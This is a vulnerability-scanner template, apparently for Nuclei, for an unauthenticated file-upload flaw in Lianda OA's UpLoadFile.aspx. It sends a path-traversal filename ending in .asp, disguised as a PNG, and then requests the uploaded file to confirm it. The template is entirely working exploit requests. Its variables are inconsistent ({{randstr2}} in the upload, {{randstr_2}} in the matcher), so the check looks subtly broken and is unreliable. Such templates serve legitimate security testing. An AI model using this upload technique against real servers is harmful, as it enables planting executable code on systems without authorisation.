id: lianda-oa-filemanage-upload

info:
  name: 联达OA UpLoadFile.aspx 文件上传漏洞
  author: qwtd
  severity: critical
  tags: 联达OA
  
http:
  - raw:
      - |
        POST /FileManage/UpLoadFile.aspx HTTP/1.1
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
        Content-Type: multipart/form-data; boundary=00content0boundary00
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Content-Length: 241
        Connection: close

        --00content0boundary00
        Content-Disposition: form-data; name="DesignId"

        1
        --00content0boundary00
        Content-Disposition: form-data; name="file"; filename="../{{randstr_1}}.asp"
        Content-Type: image/png

        {{randstr2}}
        --00content0boundary00--

      - |
        @timeout: 30s
        GET /FileManage/{{randstr_1}}.asp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200 && contains(body_2, "{{randstr_2}}")'
        condition: and